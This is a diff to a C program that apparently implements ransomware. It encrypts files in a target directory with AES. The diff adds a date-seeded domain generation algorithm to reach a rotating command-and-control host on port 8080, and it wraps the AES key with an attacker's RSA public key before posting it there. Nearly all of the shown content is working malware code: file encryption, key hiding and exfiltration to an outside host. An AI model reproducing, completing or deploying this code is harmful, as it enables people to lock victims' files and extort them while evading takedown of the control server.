@@ -7,11 +7,85 @@
 #include <sys/stat.h>
 #include <unistd.h>
 #include <curl/curl.h>
+#include <openssl/evp.h>
+#include <openssl/pem.h>
+#include <openssl/err.h>
 
 #define KEY_SIZE 32
 #define BLOCK_SIZE 16
+#define PEM "publica.pem"
+#define SEED "bm90bm90cGV0eWE="
 
-void post(char *hash, char *iv)
+void handle_errors()
+{
+    ERR_print_errors_fp(stderr);
+    abort();
+}
+
+char *domainGenAl(const char *seed, int n)
+{
+    time_t t;
+    t = time(NULL);
+    struct tm *tm = localtime(&t);
+    char date[100];
+
+    int d = 0;
+
+    // Gera data no formato DDMMYYYY
+    d = (tm->tm_mday * 100 + tm->tm_mon + 1);
+    d *= 10000;
+    d += tm->tm_year + 1900;
+
+    sprintf(date, "%d", d); // data com 8 caracteres
+
+    unsigned char date_bytes[16];
+    unsigned char seed_bytes[16];
+
+    for (int i = 0; i < 16; i++)
+    {
+        seed_bytes[i] = (unsigned char)seed[i];
+    }
+
+    for (int i = 0; i < 8; i++)
+    {
+        date_bytes[i] = (unsigned char)date[i];
+        date_bytes[i + 8] = (unsigned char)date[i]; // Repete segunda vez
+    }
+
+    // XOR
+    unsigned char xor_result[16];
+    for (int i = 0; i < 16; i++)
+    {
+        xor_result[i] = seed_bytes[i] ^ date_bytes[i];
+    }
+
+    // Normaliza
+    // Usa n para limitar o tamanho do domínio
+    char *domain = malloc(n + 1);
+    if (!domain)
+    {
+        printf("Memory error\n");
+        return NULL;
+    }
+
+    const char *charset = "abcdefghijklmnopqrstuvwxyz0123456789-";
+    int charset_len = strlen(charset);
+
+    for (int i = 0; i < n; i++)
+    {
+        // índice válido
+        int idx = xor_result[i % 16] % charset_len;
+        domain[i] = charset[idx];
+    }
+    domain[n] = '\0';
+
+    printf("Data: %s\n", date);
+    printf("Domínio gerado: %s\n", domain);
+
+    return domain;
+}
+
+void post(char *hex, char *iv, size_t n)
 {
     CURL *curl;        // handle
     CURLcode response; // codigo de retorno da func curl_easy_perform()
@@ -19,10 +93,15 @@ void post(char *hash, char *iv)
     char json[500];
 
     curl = curl_easy_init();
-    if (curl && hash != NULL)
+    char *base_domain = domainGenAl(SEED, 16);
+    char final_url[256];
+    snprintf(final_url, sizeof(final_url), "http://%s.com:8080/", base_domain);
+
+    if (curl && hex != NULL)
     {
-        curl_easy_setopt(curl, CURLOPT_URL, "http://localhost:8080/");             // configura opções no handle
-        snprintf(json, sizeof(json), "{\"hash\":\"%s\",\"iv\":\"%s\"}", hash, iv); // construção do json
+
+        curl_easy_setopt(curl, CURLOPT_URL, final_url);                          // configura opções no handle
+        snprintf(json, sizeof(json), "{\"hex\":\"%s\",\"iv\":\"%s\"}", hex, iv); // construção do json
 
         struct curl_slist *headers = NULL;
         headers = curl_slist_append(headers, "Content-Type: application/json");
@@ -41,6 +120,63 @@ void post(char *hash, char *iv)
         fprintf(stderr, "Erro: %s\n", curl_easy_strerror(response));
 
     curl_easy_cleanup(curl);
+    free(base_domain);
+}
+
+unsigned char *encAES(const char *filename, const unsigned char *msg, size_t *tam)
+{
+    FILE *input = fopen(filename, "r");
+
+    if (!input)
+    {
+        perror("Impossible to open archive with pub rsa");
+        return NULL;
+    }
+
+    EVP_PKEY *pubkey = PEM_read_PUBKEY(input, NULL, NULL, NULL);
+    fclose(input);
+
+    if (!pubkey)
+        handle_errors();
+
+    EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new(pubkey, NULL);
+    if (!ctx)
+        handle_errors();
+
+    if (EVP_PKEY_encrypt_init(ctx) <= 0)
+        handle_errors();
+
+    if (EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_OAEP_PADDING) <= 0)
+        handle_errors();
+
+    size_t outlen;
+    if (EVP_PKEY_encrypt(ctx, NULL, &outlen, (unsigned char *)msg, strlen(msg)) <= 0)
+        handle_errors();
+
+    unsigned char *out = malloc(outlen);
+    if (!out)
+    {
+        printf("Memory error\n");
+        EVP_PKEY_CTX_free(ctx);
+        EVP_PKEY_free(pubkey);
+        return NULL;
+    }
+
+    if (EVP_PKEY_encrypt(ctx, out, &outlen, (unsigned char *)msg, strlen(msg)) <= 0)
+        handle_errors();
+
+    printf("%zu bytes\n", outlen);
+
+    //-------------------------
+    for (int i = 0; i < outlen; i++)
+        printf("%02x", out[i]);
+
+    *tam = outlen;
+
+    EVP_PKEY_CTX_free(ctx);
+    EVP_PKEY_free(pubkey);
+
+    return out;
 }
 
 void enF(const char *filename, const unsigned char *key, const unsigned char *iv) // cript file
@@ -162,7 +298,10 @@ int main()
 
     printf("%s", target_directory);
     enDire(target_directory, key, iv);
-    post(hex_key, hex_iv);
+
+    size_t tam = 0;
+
+    post(encAES(PEM, hex_key, &tam), hex_iv, tam);
 
     return 0;
 }
